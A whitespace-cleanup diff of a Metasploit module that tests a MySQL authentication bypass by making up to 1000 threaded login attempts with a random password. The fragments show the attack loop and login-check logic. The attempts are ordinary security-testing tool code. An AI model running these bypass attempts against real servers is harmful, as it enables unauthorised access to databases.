@@ -48,17 +48,18 @@ class Metasploit3 < Msf::Auxiliary
 		results = []
 
 		# Username and password placeholders
-		username = datastore['USERNAME'] 
+		username = datastore['USERNAME']
 		password = Rex::Text.rand_text_alpha(rand(8)+1)
-		
+
 		# Do an initial check to see if we can log into the server at all
+
 		begin
 			socket = connect(false)
 			x = ::RbMysql.connect({
-				:host           => rhost, 
-				:port           => rport, 
-				:user           => username, 
-				:password       => password, 
+				:host           => rhost,
+				:port           => rport,
+				:user           => username,
+				:password       => password,
 				:read_timeout   => 300,
 				:write_timeout  => 300,
 				:socket         => socket
@@ -70,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 
 		rescue RbMysql::HostNotPrivileged
 			print_error "#{rhost}:#{rport} Unable to login from this host due to policy (may still be vulnerable)"
-			return 
+			return
 		rescue RbMysql::AccessDeniedError
 			print_good "#{rhost}:#{rport} The server allows logins, proceeding with bypass test"
 		rescue ::Interrupt
@@ -104,23 +105,22 @@ class Metasploit3 < Msf::Auxiliary
 
 				# keep track of how many attempts we've made
 				item = queue.shift
-				
+
 				# We can stop if we reach 1000 tries
 				break if not item
 
-				
 				# Status indicator
 				print_status "#{rhost}:#{rport} Authentication bypass is #{item/10}% complete" if (item % 100) == 0
-				
+
 				t = Thread.new(item) do |count|
-					begin 
+					begin
 						# Create our socket and make the connection
 						s = connect(false)
 						x = ::RbMysql.connect({
-							:host           => rhost, 
-							:port           => rport, 
-							:user           => username, 
-							:password       => password, 
+							:host           => rhost,
+							:port           => rport,
+							:user           => username,
+							:password       => password,
 							:read_timeout   => 300,
 							:write_timeout  => 300,
 							:socket         => s,
@@ -140,7 +140,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			# We can stop if we get a valid login
 			break if results.length > 0
-			
+
 			# Add to a list of dead threads if we're finished
 			cur_threads.each_index do |ti|
 				t = cur_threads[ti]
@@ -154,7 +154,7 @@ class Metasploit3 < Msf::Auxiliary
 
 			::IO.select(nil, nil, nil, 0.25)
 		end
-		
+
 		# Clean up any remaining threads
 		cur_threads.each {|x| x.kill }
 
